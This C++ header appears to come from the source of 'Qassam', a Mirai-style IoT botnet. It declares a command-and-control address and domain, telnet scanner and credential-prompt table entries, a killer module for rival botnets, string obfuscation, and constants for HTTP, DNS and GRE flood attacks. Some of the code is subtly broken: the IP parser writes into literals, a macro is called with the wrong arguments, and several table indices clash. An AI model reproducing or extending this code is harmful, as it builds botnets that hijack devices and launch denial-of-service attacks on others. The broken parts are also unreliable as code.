#pragma once

#ifndef QASSAM_QASSAM_ENGINE_HH
#define QASSAM_QASSAM_ENGINE_HH

#include <cstdint>
#include <cstdarg>
#include <sys/_endian.h>
#include <arpa/inet.h>
#include <string_view>
#include <charconv>
#include <unistd.h>

#include "qassam_support.hh"
#include "scanner/qassam_scanner.hh"



// Dele Please Delete WTF!
consteval std::uint32_t qassam_inet_addr_const(std::string_view ip_str)
{
    std::uint32_t o1 = 0, o2 = 0, o3 = 0, o4 = 0;
    int dot_count = 0;
    const char* start = ip_str.data();
    const char* end = ip_str.data() + ip_str.size();

    for (const char* p = start; p <= end; ++p)
    {
        if (p == end || *p == '.')
        {
            if (dot_count >= 4)
            {
                return 0;
            }
            std::string_view num_str(start, p - start);
            std::from_chars(num_str.data(), num_str.data() + num_str.size(), dot_count == 0 ? o1 : dot_count == 2 ? 03 : 04);
            dot_count++;
            start = p + 1;
        }
    }

    if (dot_count != 4)
    {
        return 0;
    }

    if (o1 > 255 || o2 > 255 || o3 > 255 || o4 > 255)
    {
        return 0;
    }
    return htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0));
}

#define QASSAM_PHI 0x9e3779b9

#define QASSAM_INET_ADDR(O1, O2, O3, O4) (htonl((O1 << 24) | (O2 << 16) | (O3 << 8) | (O4 << 0)))


using ipv4_t = std::uint32_t;
using port_t = std::uint16_t;

inline constexpr int QASSAM_STDIN = 0;
inline constexpr int QASSAM_STDOUT = 1;
inline constexpr int QASSAM_STDERR = 2;

inline constexpr int  QASSAM_KILLER_MIN_PID = 400;
inline constexpr int  QASSAM_KILLER_RESTART_SCAN_TIME = 600;


inline constexpr ipv4_t QASSAM_FAKE_CNC_ADDR = QASSAM_INET_ADDR(46, 17, 42, 41);
inline constexpr port_t QASSAM_FAKE_CNC_PORT = 23;


#ifndef USEDOMAIN
    inline constexpr ipv4_t QASSAM_SCANIP = static_cast<ipv4_t>(QASSAM_INET_ADDR("0.0.0.0"));
    inline constexpr ipv4_t QASSAM_SERVIP = static_cast<ipv4_t>(QASSAM_INET_ADDR("0.0.0.0"));
#else
    inline constexpr std::string_view QASSAM_SCANDOM = "indiatechsupport.club";
    inline constexpr std::string_view QASSAM_SERVDOM = "indiatechsupport.club";
    inline constexpr ipv4_t QASSAM_SCANIP = static_cast<ipv4_t>(QASSAM_INET_ADDR("0.0.0.0"));
    inline constexpr ipv4_t QASSAM_SERVIP = static_cast<ipv4_t>(QASSAM_INET_ADDR("0.0.0.0"));
#endif

extern ipv4_t LOCAL_ADDR;

inline constexpr int QASSAM_TABLE_CNC_PORT = 1;
inline constexpr int QASSAM_TABLE_SCAN_CB_PORT = 2;
inline constexpr int QASSAM_TABLE_EXEC_SUCCESS = 3;
inline constexpr int QASSAM_TABLE_SCAN_SHELL = 4;
inline constexpr int QASSAM_TABLE_SCAN_ENABLE = 5;
inline constexpr int QASSAM_TABLE_SCAN_SYSTEM = 6;
inline constexpr int QASSAM_TABLE_SCAN_SH = 7;
inline constexpr int QASSAM_TABLE_SCAN_QUERY = 8;
inline constexpr int QASSAM_TABLE_SCAN_RESP = 9;
inline constexpr int QASSAM_TABLE_SCAN_NCORRECT = 10;
inline constexpr int QASSAM_TABLE_SCAN_PS = 11;
inline constexpr int QASSAM_TABLE_SCAN_KILL_9 = 12;
inline constexpr int QASSAM_TABLE_KILLER_PROC = 13;
inline constexpr int QASSAM_TABLE_KILLER_EXE = 14;
inline constexpr int QASSAM_TABLE_KILLER_FD = 15;
inline constexpr int QASSAM_TABLE_KILLER_MAPS = 16;
inline constexpr int QASSAM_TABLE_KILLER_TCP = 17;
inline constexpr int QASSAM_TABLE_MEM_ROUTE = 18;
inline constexpr int QASSAM_TABLE_MEM_ASSWD = 19;
inline constexpr int QASSAM_TABLE_ATK_VSE = 20;
inline constexpr int QASSAM_TABLE_ATK_RESOLVER = 21;
inline constexpr int QASSAM_TABLE_ATK_NSERV = 22;
inline constexpr int QASSAM_TABLE_MISC_WATCHDOG = 23;
inline constexpr int QASSAM_TABLE_MISC_WATCHDOG2 = 24;
inline constexpr int QASSAM_TABLE_SCAN_ASSWORD = 25;
inline constexpr int QASSAM_TABLE_SCAN_OGIN = 26;
inline constexpr int QASSAM_TABLE_SCAN_ENTER = 27;
inline constexpr int QASSAM_TABLE_MISC_RAND = 28;
inline constexpr int QASSAM_TABLE_KILLER_STATUS = 29;
inline constexpr int QASSAM_TABLE_KILLER_ANIME = 30;
inline constexpr int QASSAM_TABLE_EXEC_MIRAI = 32;
inline constexpr int QASSAM_TABLE_EXEC_SORA1 = 33;
inline constexpr int QASSAM_TABLE_EXEC_SORA2 = 34;
inline constexpr int QASSAM_TABLE_EXEC_SORA3 = 35;
inline constexpr int QASSAM_TABLE_EXEC_OWARI = 36;
inline constexpr int QASSAM_TABLE_EXEC_OWARI2 = 37;
inline constexpr int QASSAM_TABLE_EXEC_JOSHO = 38;
inline constexpr int QASSAM_TABLE_EXEC_APOLLO = 39;
inline constexpr int QASSAM_TABLE_EXEC_STATUS = 40;
inline constexpr int QASSAM_TABLE_EXEC_ANIME = 41;
inline constexpr int QASSAM_TABLE_EXEC_ROUTE = 42;
inline constexpr int QASSAM_TABLE_EXEC_CPUINFO = 43;
inline constexpr int QASSAM_TABLE_EXEC_BOGO = 44;
inline constexpr int QASSAM_TABLE_EXEC_RC = 45;
inline constexpr int QASSAM_TABLE_EXEC_MASUTA1 = 46;
inline constexpr int QASSAM_TABLE_EXEC_MIRAI1 = 47;
inline constexpr int QASSAM_TABLE_EXEC_MIRAI2 = 48;
inline constexpr int QASSAM_TABLE_EXEC_VAMP1 = 49;
inline constexpr int QASSAM_TABLE_EXEC_VAMP3 = 50;
inline constexpr int QASSAM_TABLE_EXEC_IRC1 = 51;
inline constexpr int QASSAM_TABLE_EXEC_QBOT1 = 52;
inline constexpr int QASSAM_TABLE_EXEC_QBOT2 = 53;
inline constexpr int QASSAM_TABLE_EXEC_IRC2 = 54;
inline constexpr int QASSAM_TABLE_EXEC_MIRAI3 = 55;
inline constexpr int QASSAM_TABLE_EXEC_EXE = 56;
inline constexpr int QASSAM_TABLE_EXEC_OMNI = 57;
inline constexpr int QASSAM_TABLE_EXEC_LOL = 58;
inline constexpr int QASSAM_TABLE_EXEC_SHINTO3 = 59;
inline constexpr int QASSAM_TABLE_EXEC_SHINTO5 = 60;
inline constexpr int QASSAM_TABLE_EXEC_JOSHO5 = 61;
inline constexpr int QASSAM_TABLE_EXEC_JOSHO4 = 62;
inline constexpr int QASSAM_TABLE_KILLER_UPX = 63;

inline constexpr int QASSAM_TABLE_KILLER_REP1 = 64;
inline constexpr int QASSAM_TABLE_KILLER_REP2 = 65;
inline constexpr int QASSAM_ABLE_KILLER_REP3 = 66;
inline constexpr int QASSAM_TABLE_KILLER_REP4 = 67;
inline constexpr int QASSAM_TABLE_KILLER_REP5 = 68;
inline constexpr int QASSAM_TABLE_KILLER_REP6 = 69;
inline constexpr int QASSAM_TABLE_KILLER_REP7 = 70;
inline constexpr int QASSAM_TABLE_KILLER_REP8 = 71;
inline constexpr int QASSAM_TABLE_KILLER_REP9 = 72;
inline constexpr int QASSAM_TABLE_KILLER_REP10 = 3;

inline constexpr int QASSAM_TABLE_ATK_KEEP_ALIVE = 74;
inline constexpr int QASSAM_TABLE_ATK_ACCEPT = 75;
inline constexpr int QASSAM_TABLE_ATK_ACCEPT_LNG = 76;
inline constexpr int QASSAM_TABLE_ATK_CONTENT_TYPE = 77;
inline constexpr int QASSAM_TABLE_ATK_SET_COOKIE = 78;
inline constexpr int QASSAM_TABLE_ATK_REFRESH_HDR = 79;
inline constexpr int QASSAM_TABLE_ATK_LOCATION_HDR = 80;
inline constexpr int QASSAM_TABLE_ATK_SET_COOKIE_HDR = 81;
inline constexpr int QASSAM_TABLE_ATK_CONTENT_LENGTH_HDR = 82;
inline constexpr int QASSAM_TABLE_ATK_TRANSFER_ENCODING_HDR = 83;
inline constexpr int QASSAM_TABLE_ATK_CHUNKED = 84;
inline constexpr int QASSAM_TABLE_ATK_KEEP_ALIVE_HDR = 85;
inline constexpr int QASSAM_TABLE_ATK_CONNECTION_HDR = 86;
inline constexpr int QASSAM_TABLE_ATK_DOSARREST = 87;
inline constexpr int QASSAM_TABLE_ATK_CLOUDFLARE_NGINX = 88;
inline constexpr int QASSAM_TABLE_HTTP_1 = 89;
inline constexpr int QASSAM_TABLE_HTTP_2 = 90;
inline constexpr int QASSAM_TABLE_HTTP_3 = 91;
inline constexpr int QASSAM_TABLE_HTTP_4 = 92;
inline constexpr int QASSAM_TABLE_HTTP_5 = 93;
inline constexpr int QASSAM_TABLE_HTTP_6 = 94;
inline constexpr int QASSAM_TABLE_HTTP_7 = 95;
inline constexpr int QASSAM_TABLE_HTTP_8 = 96;
inline constexpr int QASSAM_TABLE_HTTP_9 = 97;
inline constexpr int QASSAM_TABLE_HTTP_10 = 98;
inline constexpr int QASSAM_TABLE_HTTP_11 = 99;
inline constexpr int QASSAM_TABLE_HTTP_12 = 100;
inline constexpr int QASSAM_TABLE_HTTP_13 = 101;
inline constexpr int QASSAM_TABLE_HTTP_14 = 102;
inline constexpr int QASSAM_TABLE_HTTP_15 = 103;
inline constexpr int QASSAM_TABLE_MAX_KEYS = 31;


inline constexpr int QASSAM_PROTO_DNS_QTYPE_A = 1;
inline constexpr int QASSAM_PROTO_DNS_QCLASS_IP = 1;

inline constexpr int QASSAM_PROTO_TCP_OPT_NOP = 1;
inline constexpr int QASSAM_PROTO_TCP_OPT_MSS = 2;
inline constexpr int QASSAM_PROTO_TCP_OPT_WSS = 3;
inline constexpr int QASSAM_PROTO_TCP_OPT_SACK = 4;
inline constexpr int QASSAM_PROTO_TCP_OPT_TSVAL = 8;

inline constexpr int QASSAM_PROTO_GRE_TRANS_ETH = 0x6558;

class QassamDnsHdr
{
    public:
        uint16_t id, opts, qdcount, ancount, nscount, arcount;
};

class QassamDnsQuestion
{
    public:
        uint16_t qtype, qclass;
};

class QassamDnsResource
{
    public:
        uint16_t type, _class;
        uint32_t ttl;
        uint16_t data_len;
} __attribute__((packed));

class QassamGreHdr
{
    public:
        uint16_t opts, protocol;
};

class QassamEngine : public QassamSupport, public QassamScanner, public QassamScannerConnection, public QassamScannerAuth
{
    public:
        inline uint32_t x, y, z, w;
        char *val;
        uint16_t val_len;
    #ifdef DEBUG
        bool locked;
    #endif

    public:
        void qassam_killer_init(void);
        void qassam_killer_kill(void);
        bool qassam_killer_killByPort(port_t);
        static bool qassam_memory_scan_match(char *);
        static bool qassam_has_exe_access(void);
        static bool qassam_mem_exists(char *, int, char *, int);
        void qassam_rand_init(void) noexcept;
        uint32_t qassam_rand_next(void) noexcept;
        void qassam_rand_str(char *, int) noexcept;
        void qassam_rand_alpha_str(uint8_t *, int) noexcept;
        void qassam_table_init(void);
        void qassam_table_unlock_val(uint8_t);
        void qassam_table_lock_val(uint8_t);
        char *qassam_table_retrieve_val(int, int *);
        static void qassam_add_entry(uint8_t, char *, int);
        static void qassam_toggle_obf(uint8_t);
        uint16_t qassam_checksum_generic(uint16_t *, uint32_t);
        uint16_t qassam_checksum_tcpudp(struct iphdr *, void *, uint16_t, int);

};












#endif //QASSAM_QASSAM_ENGINE_HH